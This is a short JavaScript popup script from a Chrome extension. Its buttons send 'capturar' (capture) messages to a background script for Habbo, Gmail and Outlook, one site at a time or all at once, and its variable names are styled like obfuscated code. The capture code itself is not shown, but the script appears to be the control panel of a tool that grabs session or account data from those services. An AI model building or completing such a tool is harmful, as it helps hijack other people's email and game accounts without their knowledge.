document.addEventListener('DOMContentLoaded', function() {
  const _0xst = document.getElementById('st');

  document.getElementById('all').addEventListener('click', function() {
    ['habbo', 'gmail', 'outlook'].forEach(function(_0xsite) {
      setTimeout(function() {
        chrome.runtime.sendMessage({ 'action': 'capturar', 'site': _0xsite });
      }, 300);
    });
    _0xst.textContent = 'ok';
  });

  document.querySelectorAll('.s').forEach(function(_0xbtn) {
    _0xbtn.addEventListener('click', function() {
      const _0xsite = this.dataset.s;
      chrome.runtime.sendMessage({ 'action': 'capturar', 'site': _0xsite });
      _0xst.textContent = _0xsite + ' ok';
    });
  });
});